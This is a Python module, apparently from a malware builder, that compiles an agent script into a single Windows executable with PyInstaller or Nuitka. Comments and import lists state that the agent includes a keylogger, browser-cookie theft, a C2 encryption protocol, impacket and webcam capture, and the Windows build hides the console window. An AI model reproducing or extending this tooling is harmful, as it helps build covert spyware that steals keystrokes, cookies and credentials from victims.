# strategies/compilation.py

import importlib.util
import locale
import os
import subprocess
import sys

from .base import BuildContext, CompilationStrategy


def _require_compiler_module(module_name: str, display_name: str) -> None:
    """Confirma que o compilador pertence ao mesmo Python que iniciou o Builder."""
    if importlib.util.find_spec(module_name) is None:
        raise RuntimeError(
            f"{display_name} não está instalado no interpretador atual: {sys.executable}"
        )


def _output_encoding() -> str:
    """Retorna um encoding tolerante ao console efetivo do host."""
    return sys.stdout.encoding or locale.getpreferredencoding(False) or "utf-8"


def _validate_compilation_context(context: BuildContext) -> None:
    """Falha cedo com um diagnóstico claro para contextos incompletos."""
    if context.build_dir is None:
        raise RuntimeError("Diretório temporário de build não foi inicializado.")
    if context.entry_script_path is None or not context.entry_script_path.is_file():
        raise RuntimeError("Script de entrada do build não foi preparado.")
    if not str(context.config.get("output", "")).strip():
        raise RuntimeError("Nome do artefato de saída não foi informado.")


class PyInstallerCompilation(CompilationStrategy):
    def execute(self, context: BuildContext) -> BuildContext:
        _validate_compilation_context(context)
        _require_compiler_module("PyInstaller", "PyInstaller")

        command = [sys.executable, '-m', 'PyInstaller', '--clean', '--onefile',
                   f'--distpath={context.build_dir / "dist"}', 
                   f'--workpath={context.build_dir / "build"}', 
                   f'--name={context.config["output"]}']
        
        if context.config['platform'] == 'windows':
            command.append('--noconsole')
        
        # --- CORREÇÃO PARA O KEYLOGGER E OUTROS MÓDULOS ---
        # Definimos os hidden-imports que o PyInstaller costuma ignorar
        hidden_imports = [
            'requests', 'psutil', 'cv2', 'pynput',
            'pynput.keyboard', 'pynput.keyboard._win32', 'pynput.mouse._win32',
            'pynput._util.win32',  # Crítico para o Keylogger no Windows
            'browser_cookie3', 'Cryptodome', 'PIL', 'numpy',
            # cryptography.hazmat — usado pelo encrypt_data/decrypt_data do agente (protocolo C2)
            'cryptography', 'cryptography.hazmat',
            'cryptography.hazmat.primitives', 'cryptography.hazmat.primitives.ciphers',
            'cryptography.hazmat.primitives.ciphers.modes',
            'cryptography.hazmat.backends', 'cryptography.hazmat.backends.openssl',
            # Cryptodome — features secundárias (browser cookies, file crypto)
            'Cryptodome', 'Cryptodome.Cipher', 'Cryptodome.Cipher.AES',
            'Cryptodome.Util', 'Cryptodome.Util.Padding', 'Cryptodome.Random',
            # pywin32 completo — pythoncom e win32com DEVEM estar listados
            # explicitamente; o alias genérico 'win32' não os cobre.
            'pythoncom', 'win32com', 'win32com.client', 'win32com.shell',
            'win32api', 'win32gui', 'win32con', 'win32clipboard',
            'win32security', 'win32process', 'win32event', 'win32service',
            'sqlite3', 'paramiko', 'ftplib', 'threading', 'six',
            'impacket', 'hmac', 'hashlib', 'tempfile', 'ipaddress',
        ]
        
        for module in hidden_imports:
            command.append(f'--hidden-import={module}')

        # Garante que pacotes com estrutura complexa sejam coletados por inteiro.
        # win32com: necessário para COM dispatch (win32com.client.Dispatch etc.)
        # numpy: evita erros de DLL ao importar submodules
        # Pacotes com extensões C ou estrutura dinâmica precisam de --collect-all,
        # não apenas --hidden-import. Sem isso, os .pyd/.so não são empacotados.
        collect_all_pkgs = [
            'numpy',          # evita erros de DLL em submodules
            'win32com',       # estrutura COM complexa
            'pythoncom',      # idem
            'browser_cookie3',
            # Cryptodome removido do collect-all: rs() agora usa stdlib puro (PBKDF2+XOR)
            'PIL',            # extensões C do Pillow
            'psutil',         # extensões C
            'pynput',         # backends de plataforma (_win32 etc.)
        ]
        for pkg in collect_all_pkgs:
            command.extend(['--collect-all', pkg])

        cv2_spec = importlib.util.find_spec('cv2')
        if cv2_spec and cv2_spec.origin:
            cv2_path = os.path.dirname(cv2_spec.origin)
            separator = os.pathsep
            command.append(f'--add-binary={cv2_path}{separator}cv2')
        else:
            # Se não encontrar cv2, loga o erro mas tenta prosseguir.
            print("[AVISO] OpenCV não encontrado no ambiente do compilador.")

        # Adiciona argumentos extras definidos pelo usuário no Builder.py
        extra_args = context.config.get('extra_args', [])
        command.extend(extra_args)

        command.append(str(context.entry_script_path))
        
        # Execução com captura de logs para facilitar o seu debug
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            encoding=_output_encoding(),
            errors='replace',
            check=False,
        )
        if result.returncode != 0:
            raise RuntimeError(f"PyInstaller falhou:\n{result.stderr}")
            
        context.final_artifact_path = context.build_dir / "dist" / context.config["output"]
        return context
    


class NuitkaCompilation(CompilationStrategy):
    """
    Estratégia de compilação usando Nuitka, com feedback em tempo real e sintaxe compatível.
    """
    def execute(self, context: BuildContext) -> BuildContext:
        _validate_compilation_context(context)
        _require_compiler_module("nuitka", "Nuitka")

        command = [
            sys.executable, '-m', 'nuitka', 
            '--onefile',
            '--remove-output',
            '--show-progress',
            f'--output-dir={context.build_dir / "dist"}',
            f'--output-filename={context.config["output"]}'
        ]
        
        if context.config['platform'] == 'windows':
            command.append('--windows-disable-console')
        
        modules_to_include = [
            'requests', 'psutil', 'cv2', 'pynput', 'browser_cookie3', 
            'Cryptodome', 'PIL', 'numpy', 'win32', 'win32gui', 'sqlite3',
            'http.server', 'winreg', 'threading'
        ]
        for module in modules_to_include:
            command.append(f'--include-module={module}')

        extra_args = context.config.get('extra_args', [])
        command.extend(extra_args)

        command.append(str(context.entry_script_path))

        # Encoding do console do Windows (cp1252, cp850, etc.)
        # Nuitka imprime paths usando esse encoding — não UTF-8.
        # sys.stdout.encoding captura o encoding real do terminal;
        # fallback para utf-8 em Linux/Mac onde nao ha esse problema.
        _enc = _output_encoding()

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
                # SEM text=True / encoding — lemos bytes e decodificamos manualmente
            )
            
            while True:
                raw = process.stdout.readline()
                # EOF + processo encerrado = fim do loop
                if raw == b'' and process.poll() is not None:
                    break
                if raw:
                    # errors='replace' substitui bytes invalidos por '?' em vez de crashar
                    output = raw.decode(_enc, errors='replace')
                    print(output.strip())
            
            return_code = process.poll()
            if return_code != 0:
                raise RuntimeError(f"Nuitka falhou com o código de retorno: {return_code}")

        except Exception as e:
            raise RuntimeError(f"Falha ao executar o Nuitka: {e}")
            
        context.final_artifact_path = context.build_dir / "dist" / context.config["output"]
        return context



class ScriptOutput(CompilationStrategy):
    def execute(self, context: BuildContext) -> BuildContext:
        # Para um script, o "artefato final" é apenas o script de entrada atual
        context.final_artifact_path = context.entry_script_path
        return context
